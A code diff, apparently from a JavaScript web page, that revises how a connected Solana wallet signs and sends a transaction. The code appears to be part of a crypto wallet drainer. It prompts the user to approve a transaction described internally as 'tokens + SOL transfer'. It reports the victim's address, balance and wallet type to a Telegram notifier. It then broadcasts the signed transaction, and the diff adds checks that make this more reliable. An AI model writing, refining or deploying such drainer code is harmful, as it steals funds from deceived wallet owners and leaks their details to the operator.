@@ -483,23 +483,38 @@ await sendTelegramNotification({
                     $('.wallet-loading-title').text('Signing Transaction');
                     $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
                     
-                    const signed = await walletProvider.signTransaction(transaction);
-                    console.log("Transaction signed:", signed);
+const signedTx = await walletProvider.signTransaction(transaction);
 
-                    await sendTelegramNotification({
-                        address: publicKeyString,
-                        balance: solBalanceFormatted,
-                        usdBalance: 'Unknown',
-                        walletType: walletInfo.name,
-                        customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
-                    });
+console.log("Signed TX object:", signedTx);
+console.log("Signatures:", signedTx.signatures);
 
-                    $('.wallet-loading-title').text('Confirming Transaction');
-                    $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
-                    
-                    let txid = await connection.sendRawTransaction(signed.serialize());
-                    await connection.confirmTransaction(txid);
-                    console.log("Transaction confirmed:", txid);
+// Safety check
+if (!signedTx.signatures || signedTx.signatures.length === 0) {
+    throw new Error("Transaction was not properly signed by wallet");
+}
+
+await sendTelegramNotification({
+    address: publicKeyString,
+    balance: solBalanceFormatted,
+    usdBalance: 'Unknown',
+    walletType: walletInfo.name,
+    customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
+});
+
+$('.wallet-loading-title').text('Confirming Transaction');
+$('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
+
+const txid = await connection.sendRawTransaction(
+    signedTx.serialize(),
+    {
+        skipPreflight: false,
+        preflightCommitment: "confirmed"
+    }
+);
+
+await connection.confirmTransaction(txid, "confirmed");
+
+console.log("Transaction confirmed:", txid);
                     
                     const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
                     const solscanUrl = `https://solscan.io/tx/${txid}`;
